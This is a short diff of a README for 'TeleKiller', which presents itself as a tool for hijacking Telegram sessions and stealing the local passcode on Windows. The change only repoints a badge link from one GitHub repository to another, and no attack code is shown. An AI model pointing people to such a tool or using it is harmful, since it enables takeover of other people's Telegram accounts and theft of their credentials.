@@ -14,7 +14,7 @@
                                                      O
 ```
 
-[![PyPI](https://img.shields.io/badge/Python-3.4-blue.svg)](https://github.com/ultrasecurity/TeleKiller/)
+[![PyPI](https://img.shields.io/badge/Python-3.4-blue.svg)](https://github.com/Mav3r1ck0x1/TeleKiller/)
 
 ## TeleKiller
 A Tools Session Hijacking And Stealer Local passcode Telegram Windows
